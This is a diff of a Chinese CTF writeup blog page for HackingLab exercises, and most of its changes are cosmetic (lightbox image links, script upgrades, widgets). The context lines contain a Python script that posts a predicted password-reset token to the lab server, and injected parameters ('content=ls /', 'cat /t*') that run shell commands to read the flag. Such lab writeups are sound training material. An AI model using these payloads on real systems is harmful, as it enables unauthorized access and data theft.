 <h4 id="最简单的数字取证1"><a href="#最简单的数字取证1" class="headerlink" title="最简单的数字取证1"></a>最简单的数字取证1</h4><p>这题可以直接用软件<code>DiskGenius</code>，网上一搜一大把，是一个用来分区的软件，<br>打开软件，在上方的<code>磁盘</code>-&gt;<code>打开虚拟磁盘文件</code>-&gt;选择下载下来的文件即可,之后打开磁盘可以直接看到key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/35196034.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/35196034.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/35196034.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="最简单的数字取证2"><a href="#最简单的数字取证2" class="headerlink" title="最简单的数字取证2"></a>最简单的数字取证2</h4><p>方法与上题一样，不过key文件在<code>RECYLER</code>里的一个文件中的<code>De1.txt</code>里</p>
@@ -672,7 +673,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">local = requests.session()</span><br><span class="line">a = requests.session()</span><br><span class="line">url = &quot;http://127.0.0.1/rand.php&quot;</span><br><span class="line">r = local.get(url)</span><br><span class="line">hax = r.text</span><br><span class="line">url2 = &quot;http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/resetpwd.php&quot;</span><br><span class="line">x = a.get(url2)</span><br><span class="line">x = a.post(url2,data=&#123;&apos;token&apos;: hax&#125;)</span><br><span class="line">print (x.text)</span><br></pre></td></tr></table></figure>
 <p>由于延迟，可能会有几次失败，多试几次即可<br>运行py脚本得到key:</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/36845939.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/36845939.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/36845939.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="HackingLab首台rootkit题目虚拟机-公测"><a href="#HackingLab首台rootkit题目虚拟机-公测" class="headerlink" title="HackingLab首台rootkit题目虚拟机[公测]"></a>HackingLab首台rootkit题目虚拟机[公测]</h4><p>先放上题目的提示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">要求: 找到系统rootkit后门(不是木马)并提取后门密码</span><br><span class="line">密码验证方式:验证可以远程获取root权限,则说明密码正确.</span><br><span class="line">正确的密码即为过关密码 </span><br><span class="line">虚拟机信息:[root密码hackinglab.cn] </span><br><span class="line">下载地址: http://pan.baidu.com/s/1bnoKlOj 密码: bpe5</span><br><span class="line">若无法下载请联系@CplusHua</span><br><span class="line">该题目可能难度较大，涉及到应急响应分析，病毒木马查杀，简单逆向分析等</span><br></pre></td></tr></table></figure></p>
@@ -695,13 +696,13 @@
 <p>和<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=bash&amp;content=ls /</span><br></pre></td></tr></table></figure></p>
 <p>此时可以看到</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/86147898.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/86147898.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/86147898.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>再将hh的内容改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=hh&amp;content=cat /t*</span><br></pre></td></tr></table></figure></p>
 <p>执行得到flag:</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/86052071.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/86052071.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/86052071.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 
@@ -844,6 +845,21 @@
             
             
             
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
         </p>
     </div>
 </footer>
@@ -906,21 +922,33 @@
 
     
     <!-- main-js -->
-<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
-<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.1"></script>
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/jquery.swipebox.min.js?v=1.3.2"></script>
 
 <script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
 
-<script type="text/javascript" src="/js/method.js?v=1.3.1"></script>
-<script type="text/javascript" src="/js/blog.js?v=1.3.1"></script>
+<script type="text/javascript" src="/js/method.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.3.2"></script>
 
 <!-- third-party -->
+<script type="text/javascript">
+;( function( $ ) {
+
+	$( '.swipebox' ).swipebox({
+		hideCloseButtonOnMobile: true
+	});
+
+} )( jQuery );
+</script>
 
 
 
 
 
-<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.1"></script>
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.2"></script>
 <script type="text/javascript">
 	var search_path = "search.xml";
 	if (search_path.length === 0) {
@@ -932,17 +960,21 @@
 
 
 
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
     
         <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
 <script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script type="text/javascript" src="/js/plugins/valine.js?v=1.3.1"></script>
+<script type="text/javascript" src="/js/plugins/valine.js?v=1.3.2"></script>
     
     
 
 
 
 <script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
-<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.3.1"></script>
+<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.3.2"></script>
 
 
 
@@ -981,5 +1013,5 @@
 </script>
 
     
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/hijiki.model.json"},"display":{"position":"right","width":120,"height":240},"mobile":{"show":true},"log":false});</script></body>
 </html>
